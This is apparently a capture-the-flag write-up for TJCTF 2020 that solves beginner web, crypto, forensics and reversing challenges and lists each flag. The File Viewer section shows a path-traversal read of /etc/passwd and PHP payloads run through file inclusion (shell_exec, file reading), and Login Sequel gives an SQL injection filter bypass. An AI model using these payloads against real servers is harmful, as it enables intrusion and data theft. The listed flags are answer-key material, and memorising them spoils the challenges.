# TJCTF-2020

## Overview

| Misc         | Web           | Crypto       | Reversing  | Forensics |
| ------------ | ------------- | ------------ | ---------- | --------- |
| A First Step | Broken Button | Circles      | Forwarding | Ling Ling |
| Discord      | Login         | Speed Runner |            |           |
|              | File Viewer   | Typewriter   |            |           |
|              | Login Sequel  | Titanic      |            |           |

### A First Step (Misc) - 5

Free flag.

> Flag : `tjctf{so0p3r_d0oper_5ecr3t}`

### Discord (Misc) - 5

Join the Discord server for a flag.

> Flag : `tjctf{we_love_wumpus}`

### Broken Button (Web) - 10

The link opens up a website with a hidden button like so.

`<button class="hidden" href="find_the_flag!.html"></button>`

Navigating to find_the_flag!.html gives us the flag.

> Flag : `tjctf{wHa1_A_Gr8_1nsp3ct0r!}`

### Circles (Crypto) - 10

The hint leads us to this website : https://www.fonts.com
Searching for circular fonts gives us the required typeface and we can convert the given string to plaintext.

> Flag : `tjctf{B3auT1ful_f0Nt}`

### Speed Runner (Crypto) - 10

The title hints at a running key cipher. Use any tool to bruteforce a running key/ Vigenère cipher.
I used : https://www.boxentriq.com/code-breaking/vigenere-cipher

> Flag : `tjctf{new_tech_new_tech_go_fast_go_fast}`

### Forwarding (Reversing) - 10

The file given to us is a linux binary that prompts us to ..."guess the flag"?
Just an attempt to grab low hanging fruit by running `strings` on the executable gives us the flag.

> Flag : `tjctf{just_g3tt1n9_st4rt3d}`

### Ling Ling (Forensics) - 10

Since the question hints at soemthing to do with the creator of the image, we can use `exiftool` to look for metadata. The artist parameter contains the flag.

> Flag : `tjctf{ch0p1n_fl4gs}`

### Login (Web) - 30

Viewing the page source shows us some slighlty obfuscated Javascript. We can use any online Javascript beautifier to view the code. I used : http://www.jsnice.org

The resulting code was as follows :

```javascript
var a = [
  "value",
  "4312a7be33f09cc7ccd1d8a237265798",
  "Sorry. Wrong username or password.",
  "admin",
  "tjctf{",
  "getElementsByName",
  "toString",
];
(function (data, i) {
  var write = function (isLE) {
    for (; --isLE; ) {
      data["push"](data["shift"]());
    }
  };
  write(++i);
})(a, 487);

var b = function (level, ai_test) {
  level = level - 0;
  var rowsOfColumns = a[level];
  return rowsOfColumns;
};

checkUsername = function () {
  username = document[b("0x1")]("username")[0]["value"];
  password = document[b("0x1")]("password")[0][b("0x3")];
  temp = md5(password)[b("0x2")]();
  if (username == b("0x6") && temp == b("0x4")) {
    alert(b("0x0") + password + "890898}");
  } else {
    alert(b("0x5"));
  }
};
```

I converted the hex variables \_0xb31c = a and \_0x4a84 = b for easier readability. With this cleaned syntax, we observer the following. The checkUsername() function is called when the Login button is clicked on the webpage. We can now make a few assumptions based on intuition and trial and error.

1. "Sorry. Wrong username or password." is displayed when incorrect credentials are entered.
2. The flag is displayed if the correct credentials are entered.
3. The username variable should ideally be assigned like so : `username = document.getElementById("username")[0]["value"];`
4. The password variable should ideally be assigned like so : `password = document.getElementById("password")[0]["value"];`
5. Since "admin" is in the array `a`, it could be the desired username.
6. The first part of the flag, "tjctf{" is also in the array `a`.
7. The "toString" method is in the array `a`. This is used to convert the password to a string type just before hashing.
8. since the variable `temp` is the md5 hash of the password, it should be equal to "4312a7be33f09cc7ccd1d8a237265798" which is a hash in array `a`.

```
// b("0x1") = "getElementsByName"
// b("0x3") = "value"
// b("0x4") = "4312a7be33f09cc7ccd1d8a237265798"
// b("0x5") = "Sorry. Wrong username or password."
// b("0x0") = "tjctf{"
// b("0x2") = "toString"
// b("0x6") = "admin"
```

From the above assumptions we can evaluate the following :

```javascript
if (username == b("0x6") && temp == b("0x4")) {
  alert(b("0x0") + password + "890898}");
}
```

This means that if `username == "admin"` and `password == x` where `md5(x) == "4312a7be33f09cc7ccd1d8a237265798"` are entered as the right credentials, the flag would be displayed. We can use any online decrypter to decrypt this md5 hash and get `x == "horizons"`. So entering admin as the username and horizons as the password gives us the flag.

> Flag : `tjctf{horizons890898}`

### Typewriter (Crypto) - 30

The hint provided is : "a becomes q, b becomes w, c becomes e, f becomes y, j becomes p, t becomes z, and z becomes m. Do you see the pattern?"

It looks like the QWERTY keyboard characters have been converted to regular alphabertical charaters. A simple script like this would get the job done.

```python
flag = 'zpezy{fg_dgkt_atn_pqdl}'
typewriter_order = 'qwertyuiopasdfghjklzxcvbnm'
alphabetical_order = 'abcdefghijklmnopqrstuvwxyz'

for i in range(len(flag)):
    if flag[i] == '_' or flag[i] == '{' or flag[i] == '}':
        print(flag[i], end='')
    else:
        # find index of flag[i] in typewriter_order.
        # print the corresponding alphabetical_order character.
        for j in range(len(typewriter_order)):
            if flag[i] == typewriter_order[j]:
                print(alphabetical_order[j], end='')
```

> Flag : `tjctf{no_more_key_jams}`

### File Viewer (Web) - 70

The problem looks like some type of a file inclusion vulnerability. Navigating to /../../../etc/passwd to test for LFI by passing "/../../../etc/passwd" as the file parameter gives us the passwd file on the server. It appears as though any text passed to the file parameter is executed. We can try using php to get some output from a website like pastebin:

```php
<?php
 echo shell_exec('ls');
?>
```

We get the output as expected on the screen. A directory called 'i_wonder_whats_in_here' seems interesting so we navigate there and find flag.php. We can then use this piece of code to get the flag :

```php
<?php
 echo file_get_contents('/var/www/html/i_wonder_whats_in_here/flag.php');
?>
```

Flag : tjctf{l0CaL_f1L3_InCLUsi0N_is_bad}

### Login Sequel (Web) -

The webpage, although vulnerable to SQLi, filters out some characters like '--'. So we can bypass the filter by logging in with `admin'/*`

> Flag : `tjctf{W0w_wHa1_a_SqL1_exPeRt!}`

### Titanic (Crypto) - 35

Just download the titanic movie script and use the following python code to convert all the words into md5 hashes and test it with the provided hash of the flag.

```python
import hashlib

# part 1 : get the words

alphabets = 'abcdefghijklmnopqrstuvwxyz'
file_obj = open('titanic_wordlist.txt', 'r')
contents = file_obj.read()
test_words = contents.split()
wordlist = []
for word in test_words:
    new_word = ''
    for ch in word:
        if ch in alphabets or ch in alphabets.upper() or ch in ['"', '\'']:
            new_word += ch.lower()
    if len(new_word) != 0:
        wordlist.append(new_word)
file_obj.close()

# part 2 : test word against flag hashes
# flag format : tjctf{pass}
# flag hash : e246dbab7ae3a6ed41749e20518fcecd

flag_hash = 'e246dbab7ae3a6ed41749e20518fcecd'
found = False
for i, word in enumerate(wordlist):
    test_flag = 'tjctf{' + word + '}'
    hash_obj = hashlib.md5(test_flag.encode())
    test_hash = hash_obj.hexdigest()
    print(i, '. testing : ', test_flag, test_hash)
    if test_hash == flag_hash:
        print('flag found!', test_flag)
        found = True
        break
if found == False:
    print('flag not found :(')
```

> Flag : `tjctf{ismay's}`
